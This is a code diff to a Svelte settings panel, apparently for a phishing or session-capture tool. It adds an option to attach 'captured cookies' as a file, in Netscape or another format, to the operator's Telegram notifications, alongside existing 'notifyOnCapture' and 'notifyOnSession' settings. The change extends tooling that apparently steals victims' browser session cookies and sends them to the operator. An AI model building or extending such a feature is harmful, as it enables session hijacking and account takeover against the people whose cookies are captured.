@@ -19,6 +19,7 @@
 		notifyOnCapture: true,
 		notifyOnSession: true,
 		dataLevel: 'standard',
+		sendCookieFile: false,
 		cookieFormat: 'netscape'
 	};
 
@@ -171,8 +172,17 @@
 				</div>
 			</div>
 
-			<!-- Cookie Format (shown when data level is 'full') -->
+			<!-- Cookie Attachment (shown when data level is 'full') -->
 			{#if formValues.dataLevel === 'full'}
+				<div class="space-y-4">
+					<label class="flex items-center gap-2">
+						<input type="checkbox" bind:checked={formValues.sendCookieFile} class="rounded border-gray-300 text-blue-600 focus:ring-blue-500" />
+						<span class="text-sm font-medium text-gray-700 dark:text-gray-300">Attach cookie file to notifications</span>
+					</label>
+					<p class="text-xs text-gray-500 dark:text-gray-400 ml-6">When enabled, captured cookies will be sent as a downloadable file attachment in your Telegram notifications.</p>
+				</div>
+
+				{#if formValues.sendCookieFile}
 				<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
 					<div class="flex flex-col">
 						<label class="font-semibold text-slate-600 dark:text-gray-400 py-2 transition-colors duration-200">Cookie Format</label>
@@ -191,6 +201,7 @@
 						</div>
 					</div>
 				</div>
+				{/if}
 			{/if}
 
 			<!-- Error -->
